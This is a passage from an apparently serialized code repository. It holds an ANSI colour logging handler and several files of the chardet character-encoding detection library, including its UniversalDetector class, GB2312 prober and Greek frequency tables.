    self.handleError(record)\n\n    if not IS_WIN:\n        def output_colorized(self, message):\n            self.stream.write(message)\n    else:\n        ansi_esc = re.compile(r'\\x1b\\[((?:\\d+)(?:;(?:\\d+))*)m')\n\n        nt_color_map = {\n            0: 0x00,    # black\n            1: 0x04,    # red\n            2: 0x02,    # green\n            3: 0x06,    # yellow\n            4: 0x01,    # blue\n            5: 0x05,    # magenta\n            6: 0x03,    # cyan\n            7: 0x07,    # white\n        }\n\n        def output_colorized(self, message):\n            parts = self.ansi_esc.split(message)\n            h = None\n            fd = getattr(self.stream, 'fileno', None)\n\n            if fd is not None:\n                fd = fd()\n\n                if fd in (1, 2): # stdout or stderr\n                    h = ctypes.windll.kernel32.GetStdHandle(-10 - fd)\n\n            while parts:\n                text = parts.pop(0)\n\n                if text:\n                    self.stream.write(text)\n                    self.stream.flush()\n\n                if parts:\n                    params = parts.pop(0)\n\n                    if h is not None:\n                        params = [int(p) for p in params.split(';')]\n                        color = 0\n\n                        for p in params:\n                            if 40 <= p <= 47:\n                                color |= self.nt_color_map[p - 40] << 4\n                            elif 30 <= p <= 37:\n                                color |= self.nt_color_map[p - 30]\n                            elif p == 1:\n                                color |= 0x08 # foreground intensity on\n                            elif p == 0: # reset to default color\n                                color = 0x07\n                            else:\n                                pass # error condition ignored\n\n                        ctypes.windll.kernel32.SetConsoleTextAttribute(h, color)\n\n    def _reset(self, message):\n        if not message.endswith(self.reset):\n            reset = self.reset\n        elif self.bold in message:  # bold\n            reset = self.reset + self.bold\n        else:\n            reset = self.reset\n\n        return reset\n\n    def colorize(self, message, levelno):\n        if levelno in self.level_map and self.is_tty:\n            bg, fg, bold = self.level_map[levelno]\n            params = []\n\n            if bg in self.color_map:\n                params.append(str(self.color_map[bg] + 40))\n\n            if fg in self.color_map:\n                params.append(str(self.color_map[fg] + 30))\n\n            if bold:\n                params.append('1')\n\n            if params and message:\n                if message.lstrip() != message:\n                    prefix = re.search(r\"\\s+\", message).group(0)\n                    message = message[len(prefix):]\n                else:\n                    prefix = \"\"\n\n                message = \"%s%s\" % (prefix, ''.join((self.csi, ';'.join(params),\n                                   'm', message, self.reset)))\n\n        return message\n\n    def format(self, record):\n        message = logging.StreamHandler.format(self, record)\n        return self.colorize(message, record.levelno)\n", "thirdparty/ansistrm/__init__.py": "", "thirdparty/chardet/universaldetector.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Universal charset detector code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 2001\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#   Shy Shalom - original C code\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\"\"\"\nModule containing the UniversalDetector detector class, which is the primary\nclass a user of ``chardet`` should use.\n\n:author: Mark Pilgrim (initial port to Python)\n:author: Shy Shalom (original C code)\n:author: Dan Blanchard (major refactoring for 3.0)\n:author: Ian Cordasco\n\"\"\"\n\n\nimport codecs\nimport logging\nimport re\n\nfrom .charsetgroupprober import CharSetGroupProber\nfrom .enums import InputState, LanguageFilter, ProbingState\nfrom .escprober import EscCharSetProber\nfrom .latin1prober import Latin1Prober\nfrom .mbcsgroupprober import MBCSGroupProber\nfrom .sbcsgroupprober import SBCSGroupProber\n\n\nclass UniversalDetector(object):\n    \"\"\"\n    The ``UniversalDetector`` class underlies the ``chardet.detect`` function\n    and coordinates all of the different charset probers.\n\n    To get a ``dict`` containing an encoding and its confidence, you can simply\n    run:\n\n    .. code::\n\n            u = UniversalDetector()\n            u.feed(some_bytes)\n            u.close()\n            detected = u.result\n\n    \"\"\"\n\n    MINIMUM_THRESHOLD = 0.20\n    HIGH_BYTE_DETECTOR = re.compile(b'[\\x80-\\xFF]')\n    ESC_DETECTOR = re.compile(b'(\\033|~{)')\n    WIN_BYTE_DETECTOR = re.compile(b'[\\x80-\\x9F]')\n    ISO_WIN_MAP = {'iso-8859-1': 'Windows-1252',\n                   'iso-8859-2': 'Windows-1250',\n                   'iso-8859-5': 'Windows-1251',\n                   'iso-8859-6': 'Windows-1256',\n                   'iso-8859-7': 'Windows-1253',\n                   'iso-8859-8': 'Windows-1255',\n                   'iso-8859-9': 'Windows-1254',\n                   'iso-8859-13': 'Windows-1257'}\n\n    def __init__(self, lang_filter=LanguageFilter.ALL):\n        self._esc_charset_prober = None\n        self._charset_probers = []\n        self.result = None\n        self.done = None\n        self._got_data = None\n        self._input_state = None\n        self._last_char = None\n        self.lang_filter = lang_filter\n        self.logger = logging.getLogger(__name__)\n        self._has_win_bytes = None\n        self.reset()\n\n    def reset(self):\n        \"\"\"\n        Reset the UniversalDetector and all of its probers back to their\n        initial states.  This is called by ``__init__``, so you only need to\n        call this directly in between analyses of different documents.\n        \"\"\"\n        self.result = {'encoding': None, 'confidence': 0.0, 'language': None}\n        self.done = False\n        self._got_data = False\n        self._has_win_bytes = False\n        self._input_state = InputState.PURE_ASCII\n        self._last_char = b''\n        if self._esc_charset_prober:\n            self._esc_charset_prober.reset()\n        for prober in self._charset_probers:\n            prober.reset()\n\n    def feed(self, byte_str):\n        \"\"\"\n        Takes a chunk of a document and feeds it through all of the relevant\n        charset probers.\n\n        After calling ``feed``, you can check the value of the ``done``\n        attribute to see if you need to continue feeding the\n        ``UniversalDetector`` more data, or if it has made a prediction\n        (in the ``result`` attribute).\n\n        .. note::\n           You should always call ``close`` when you're done feeding in your\n           document if ``done`` is not already ``True``.\n        \"\"\"\n        if self.done:\n            return\n\n        if not len(byte_str):\n            return\n\n        if not isinstance(byte_str, bytearray):\n            byte_str = bytearray(byte_str)\n\n        # First check for known BOMs, since these are guaranteed to be correct\n        if not self._got_data:\n            # If the data starts with BOM, we know it is UTF\n            if byte_str.startswith(codecs.BOM_UTF8):\n                # EF BB BF  UTF-8 with BOM\n                self.result = {'encoding': \"UTF-8-SIG\",\n                               'confidence': 1.0,\n                               'language': ''}\n            elif byte_str.startswith((codecs.BOM_UTF32_LE,\n                                      codecs.BOM_UTF32_BE)):\n                # FF FE 00 00  UTF-32, little-endian BOM\n                # 00 00 FE FF  UTF-32, big-endian BOM\n                self.result = {'encoding': \"UTF-32\",\n                               'confidence': 1.0,\n                               'language': ''}\n            elif byte_str.startswith(b'\\xFE\\xFF\\x00\\x00'):\n                # FE FF 00 00  UCS-4, unusual octet order BOM (3412)\n                self.result = {'encoding': \"X-ISO-10646-UCS-4-3412\",\n                               'confidence': 1.0,\n                               'language': ''}\n            elif byte_str.startswith(b'\\x00\\x00\\xFF\\xFE'):\n                # 00 00 FF FE  UCS-4, unusual octet order BOM (2143)\n                self.result = {'encoding': \"X-ISO-10646-UCS-4-2143\",\n                               'confidence': 1.0,\n                               'language': ''}\n            elif byte_str.startswith((codecs.BOM_LE, codecs.BOM_BE)):\n                # FF FE  UTF-16, little endian BOM\n                # FE FF  UTF-16, big endian BOM\n                self.result = {'encoding': \"UTF-16\",\n                               'confidence': 1.0,\n                               'language': ''}\n\n            self._got_data = True\n            if self.result['encoding'] is not None:\n                self.done = True\n                return\n\n        # If none of those matched and we've only see ASCII so far, check\n        # for high bytes and escape sequences\n        if self._input_state == InputState.PURE_ASCII:\n            if self.HIGH_BYTE_DETECTOR.search(byte_str):\n                self._input_state = InputState.HIGH_BYTE\n            elif self._input_state == InputState.PURE_ASCII and \\\n                    self.ESC_DETECTOR.search(self._last_char + byte_str):\n                self._input_state = InputState.ESC_ASCII\n\n        self._last_char = byte_str[-1:]\n\n        # If we've seen escape sequences, use the EscCharSetProber, which\n        # uses a simple state machine to check for known escape sequences in\n        # HZ and ISO-2022 encodings, since those are the only encodings that\n        # use such sequences.\n        if self._input_state == InputState.ESC_ASCII:\n            if not self._esc_charset_prober:\n                self._esc_charset_prober = EscCharSetProber(self.lang_filter)\n            if self._esc_charset_prober.feed(byte_str) == ProbingState.FOUND_IT:\n                self.result = {'encoding':\n                               self._esc_charset_prober.charset_name,\n                               'confidence':\n                               self._esc_charset_prober.get_confidence(),\n                               'language':\n                               self._esc_charset_prober.language}\n                self.done = True\n        # If we've seen high bytes (i.e., those with values greater than 127),\n        # we need to do more complicated checks using all our multi-byte and\n        # single-byte probers that are left.  The single-byte probers\n        # use character bigram distributions to determine the encoding, whereas\n        # the multi-byte probers use a combination of character unigram and\n        # bigram distributions.\n        elif self._input_state == InputState.HIGH_BYTE:\n            if not self._charset_probers:\n                self._charset_probers = [MBCSGroupProber(self.lang_filter)]\n                # If we're checking non-CJK encodings, use single-byte prober\n                if self.lang_filter & LanguageFilter.NON_CJK:\n                    self._charset_probers.append(SBCSGroupProber())\n                self._charset_probers.append(Latin1Prober())\n            for prober in self._charset_probers:\n                if prober.feed(byte_str) == ProbingState.FOUND_IT:\n                    self.result = {'encoding': prober.charset_name,\n                                   'confidence': prober.get_confidence(),\n                                   'language': prober.language}\n                    self.done = True\n                    break\n            if self.WIN_BYTE_DETECTOR.search(byte_str):\n                self._has_win_bytes = True\n\n    def close(self):\n        \"\"\"\n        Stop analyzing the current document and come up with a final\n        prediction.\n\n        :returns:  The ``result`` attribute, a ``dict`` with the keys\n                   `encoding`, `confidence`, and `language`.\n        \"\"\"\n        # Don't bother with checks if we're already done\n        if self.done:\n            return self.result\n        self.done = True\n\n        if not self._got_data:\n            self.logger.debug('no data received!')\n\n        # Default to ASCII if it is all we've seen so far\n        elif self._input_state == InputState.PURE_ASCII:\n            self.result = {'encoding': 'ascii',\n                           'confidence': 1.0,\n                           'language': ''}\n\n        # If we have seen non-ASCII, return the best that met MINIMUM_THRESHOLD\n        elif self._input_state == InputState.HIGH_BYTE:\n            prober_confidence = None\n            max_prober_confidence = 0.0\n            max_prober = None\n            for prober in self._charset_probers:\n                if not prober:\n                    continue\n                prober_confidence = prober.get_confidence()\n                if prober_confidence > max_prober_confidence:\n                    max_prober_confidence = prober_confidence\n                    max_prober = prober\n            if max_prober and (max_prober_confidence > self.MINIMUM_THRESHOLD):\n                charset_name = max_prober.charset_name\n                lower_charset_name = max_prober.charset_name.lower()\n                confidence = max_prober.get_confidence()\n                # Use Windows encoding name instead of ISO-8859 if we saw any\n                # extra Windows-specific bytes\n                if lower_charset_name.startswith('iso-8859'):\n                    if self._has_win_bytes:\n                        charset_name = self.ISO_WIN_MAP.get(lower_charset_name,\n                                                            charset_name)\n                self.result = {'encoding': charset_name,\n                               'confidence': confidence,\n                               'language': max_prober.language}\n\n        # Log all prober confidences if none met MINIMUM_THRESHOLD\n        if self.logger.getEffectiveLevel() == logging.DEBUG:\n            if self.result['encoding'] is None:\n                self.logger.debug('no probers hit minimum threshold')\n                for group_prober in self._charset_probers:\n                    if not group_prober:\n                        continue\n                    if isinstance(group_prober, CharSetGroupProber):\n                        for prober in group_prober.probers:\n                            self.logger.debug('%s %s confidence = %s',\n                                              prober.charset_name,\n                                              prober.language,\n                                              prober.get_confidence())\n                    else:\n                        self.logger.debug('%s %s confidence = %s',\n                                          prober.charset_name,\n                                          prober.language,\n                                          prober.get_confidence())\n        return self.result\n", "thirdparty/chardet/gb2312prober.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is mozilla.org code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .mbcharsetprober import MultiByteCharSetProber\nfrom .codingstatemachine import CodingStateMachine\nfrom .chardistribution import GB2312DistributionAnalysis\nfrom .mbcssm import GB2312_SM_MODEL\n\nclass GB2312Prober(MultiByteCharSetProber):\n    def __init__(self):\n        super(GB2312Prober, self).__init__()\n        self.coding_sm = CodingStateMachine(GB2312_SM_MODEL)\n        self.distribution_analyzer = GB2312DistributionAnalysis()\n        self.reset()\n\n    @property\n    def charset_name(self):\n        return \"GB2312\"\n\n    @property\n    def language(self):\n        return \"Chinese\"\n", "thirdparty/chardet/langgreekmodel.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Communicator client code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\n# 255: Control characters that usually does not exist in any text\n# 254: Carriage/Return\n# 253: symbol (punctuation) that does not belong to word\n# 252: 0 - 9\n\n# Character Mapping Table:\nLatin7_char_to_order_map = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253, 82,100,104, 94, 98,101,116,102,111,187,117, 92, 88,113, 85,  # 40\n 79,118,105, 83, 67,114,119, 95, 99,109,188,253,253,253,253,253,  # 50\n253, 72, 70, 80, 81, 60, 96, 93, 89, 68,120, 97, 77, 86, 69, 55,  # 60\n 78,115, 65, 66, 58, 76,106,103, 87,107,112,253,253,253,253,253,  # 70\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 80\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 90\n253,233, 90,253,253,253,253,253,253,253,253,253,253, 74,253,253,  # a0\n253,253,253,253,247,248, 61, 36, 46, 71, 73,253, 54,253,108,123,  # b0\n110, 31, 51, 43, 41, 34, 91, 40, 52, 47, 44, 53, 38, 49, 59, 39,  # c0\n 35, 48,250, 37, 33, 45, 56, 50, 84, 57,120,121, 17, 18, 22, 15,  # d0\n124,  1, 29, 20, 21,  3, 32, 13, 25,  5, 11, 16, 10,  6, 30,  4,  # e0\n  9,  8, 14,  7,  2, 12, 28, 23, 42, 24, 64, 75, 19, 26, 27,253,  # f0\n)\n\nwin1253_char_to_order_map = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253, 82,100,104, 94, 98,101,116,102,111,187,117, 92, 88,113, 85,  # 40\n 79,118,105, 83, 67,114,119, 95, 99,109,188,253,253,253,253,253,  # 50\n253, 72, 70, 80, 81, 60, 96, 93, 89, 68,120, 97, 77, 86, 69, 55,  # 60\n 78,115, 65, 66, 58, 76,106,103, 87,107,112,253,253,253,253,253,  # 70\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 80\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 90\n253,233, 61,253,253,253,253,253,253,253,253,253,253, 74,253,253,  # a0\n253,253,253,253,247,253,253, 36, 46, 71, 73,253, 54,253,108,123,  # b0\n110, 31, 51, 43, 41, 34, 91, 40, 52, 47, 44, 53, 38, 49, 59, 39,  # c0\n 35, 48,250, 37, 33, 45, 56, 50, 84, 57,120,121, 17, 18, 22, 15,  # d0\n124,  1, 29, 20, 21,  3, 32, 13, 25,  5, 11, 16, 10,  6, 30,  4,  # e0\n  9,  8, 14,  7,  2, 12, 28, 23, 42, 24, 64, 75, 19, 26, 27,253,  # f0\n)\n\n# Model Table:\n# total sequences: 100%\n# first 512 sequences: 98.2851%\n# first 1024 sequences:1.7001%\n# rest  sequences:     0.0359%\n# negative sequences:  0.0148%\nGreekLangModel = (\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,3,2,2,3,3,3,3,3,3,3,3,1,3,3,3,0,2,2,3,3,0,3,0,3,2,0,3,3,3,0,\n3,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,3,3,3,3,0,3,3,0,3,2,3,3,0,3,2,3,3,3,0,0,3,0,3,0,3,3,2,0,0,0,\n2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,\n0,2,3,2,2,3,3,3,3,3,3,3,3,0,3,3,3,3,0,2,3,3,0,3,3,3,3,2,3,3,3,0,\n2,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,2,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,0,2,1,3,3,3,3,2,3,3,2,3,3,2,0,\n0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,3,3,3,0,3,3,3,3,3,3,0,3,3,0,3,3,3,3,3,3,3,3,3,3,0,3,2,3,3,0,\n2,0,1,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,\n0,3,3,3,3,3,2,3,0,0,0,0,3,3,0,3,1,3,3,3,0,3,3,0,3,3,3,3,0,0,0,0,\n2,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,3,3,3,3,0,3,0,3,3,3,3,3,0,3,2,2,2,3,0,2,3,3,3,3,3,2,3,3,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,3,3,3,3,3,2,2,2,3,3,3,3,0,3,1,3,3,3,3,2,3,3,3,3,3,3,3,2,2,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,3,3,3,3,2,0,3,0,0,0,3,3,2,3,3,3,3,3,0,0,3,2,3,0,2,3,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,0,3,3,3,3,0,0,3,3,0,2,3,0,3,0,3,3,3,0,0,3,0,3,0,2,2,3,3,0,0,\n0,0,1,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,3,3,3,3,2,0,3,2,3,3,3,3,0,3,3,3,3,3,0,3,3,2,3,2,3,3,2,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,3,2,3,2,3,3,3,3,3,3,0,2,3,2,3,2,2,2,3,2,3,3,2,3,0,2,2,2,3,0,\n2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,3,0,0,0,3,3,3,2,3,3,0,0,3,0,3,0,0,0,3,2,0,3,0,3,0,0,2,0,2,0,\n0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,3,3,3,0,3,3,3,3,3,3,0,3,3,0,3,0,0,0,3,3,0,3,3,3,0,0,1,2,3,0,\n3,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,3,3,3,3,2,0,0,3,2,2,3,3,0,3,3,3,3,3,2,1,3,0,3,2,3,3,2,1,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,3,3,0,2,3,3,3,3,3,3,0,0,3,0,3,0,0,0,3,3,0,3,2,3,0,0,3,3,3,0,\n3,0,0,0,2,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,3,3,3,0,3,3,3,3,3,3,0,0,3,0,3,0,0,0,3,2,0,3,2,3,0,0,3,2,3,0,\n2,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,3,1,2,2,3,3,3,3,3,3,0,2,3,0,3,0,0,0,3,3,0,3,0,2,0,0,2,3,1,0,\n2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,0,3,3,3,3,0,3,0,3,3,2,3,0,3,3,3,3,3,3,0,3,3,3,0,2,3,0,0,3,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,0,3,3,3,0,0,3,0,0,0,3,3,0,3,0,2,3,3,0,0,3,0,3,0,3,3,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,3,0,0,0,3,3,3,3,3,3,0,0,3,0,2,0,0,0,3,3,0,3,0,3,0,0,2,0,2,0,\n0,0,0,0,1,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,3,3,3,3,3,0,3,0,2,0,3,2,0,3,2,3,2,3,0,0,3,2,3,2,3,3,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,3,0,0,2,3,3,3,3,3,0,0,0,3,0,2,1,0,0,3,2,2,2,0,3,0,0,2,2,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,0,3,3,3,2,0,3,0,3,0,3,3,0,2,1,2,3,3,0,0,3,0,3,0,3,3,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,2,3,3,3,0,3,3,3,3,3,3,0,2,3,0,3,0,0,0,2,1,0,2,2,3,0,0,2,2,2,0,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,3,0,0,2,3,3,3,2,3,0,0,1,3,0,2,0,0,0,0,3,0,1,0,2,0,0,1,1,1,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,3,3,3,3,1,0,3,0,0,0,3,2,0,3,2,3,3,3,0,0,3,0,3,2,2,2,1,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,0,3,3,3,0,0,3,0,0,0,0,2,0,2,3,3,2,2,2,2,3,0,2,0,2,2,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,3,3,3,2,0,0,0,0,0,0,2,3,0,2,0,2,3,2,0,0,3,0,3,0,3,1,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,3,2,3,3,2,2,3,0,2,0,3,0,0,0,2,0,0,0,0,1,2,0,2,0,2,0,\n0,2,0,2,0,2,2,0,0,1,0,2,2,2,0,2,2,2,0,2,2,2,0,0,2,0,0,1,0,0,0,0,\n0,2,0,3,3,2,0,0,0,0,0,0,1,3,0,2,0,2,2,2,0,0,2,0,3,0,0,2,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,0,2,3,2,0,2,2,0,2,0,2,2,0,2,0,2,2,2,0,0,0,0,0,0,2,3,0,0,0,2,\n0,1,2,0,0,0,0,2,2,0,0,0,2,1,0,2,2,0,0,0,0,0,0,1,0,2,0,0,0,0,0,0,\n0,0,2,1,0,2,3,2,2,3,2,3,2,0,0,3,3,3,0,0,3,2,0,0,0,1,1,0,2,0,2,2,\n0,2,0,2,0,2,2,0,0,2,0,2,2,2,0,2,2,2,2,0,0,2,0,0,0,2,0,1,0,0,0,0,\n0,3,0,3,3,2,2,0,3,0,0,0,2,2,0,2,2,2,1,2,0,0,1,2,2,0,0,3,0,0,0,2,\n0,1,2,0,0,0,1,2,0,0,0,0,0,0,0,2,2,0,1,0,0,2,0,0,0,2,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,2,3,3,2,2,0,0,0,2,0,2,3,3,0,2,0,0,0,0,0,0,2,2,2,0,2,2,0,2,0,2,\n0,2,2,0,0,2,2,2,2,1,0,0,2,2,0,2,0,0,2,0,0,0,0,0,0,2,0,0,0,0,0,0,\n0,2,0,3,2,3,0,0,0,3,0,0,2,2,0,2,0,2,2,2,0,0,2,0,0,0,0,0,0,0,0,2,\n0,0,2,2,0,0,2,2,2,0,0,0,0,0,0,2,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,2,0,0,3,2,0,2,2,2,2,2,0,0,0,2,0,0,0,0,2,0,1,0,0,2,0,1,0,0,0,\n0,2,2,2,0,2,2,0,1,2,0,2,2,2,0,2,2,2,2,1,2,2,0,0,2,0,0,0,0,0,0,0,\n0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,\n0,2,0,2,0,2,2,0,0,0,0,1,2,1,0,0,2,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,3,2,3,0,0,2,0,0,0,2,2,0,2,0,0,0,1,0,0,2,0,2,0,2,2,0,0,0,0,\n0,0,2,0,0,0,0,2,2,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,\n0,2,2,3,2,2,0,0,0,0,0,0,1,3,0,2,0,2,2,0,0,0,1,0,2,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,2,0,2,0,3,2,0,2,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n0,0,2,0,0,0,0,1,1,0,0,2,1,2,0,2,2,0,1,0,0,1,0,0,0,2,0,0,0,0,0,0,\n0,3,0,2,2,2,0,0,2,0,0,0,2,0,0,0,2,3,0,2,0,0,0,0,0,0,2,2,0,0,0,2,\n0,1,2,0,0,0,1,2,2,1,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,2,1,2,0,2,2,0,2,0,0,2,0,0,0,0,1,2,1,0,2,1,0,0,0,0,0,0,0,0,0,0,\n0,0,2,0,0,0,3,1,2,2,0,2,0,0,0,0,2,0,0,0,2,0,0,3,0,0,0,0,2,2,2,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,2,1,0,2,0,1,2,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,1,0,0,0,0,0,0,2,\n0,2,2,0,0,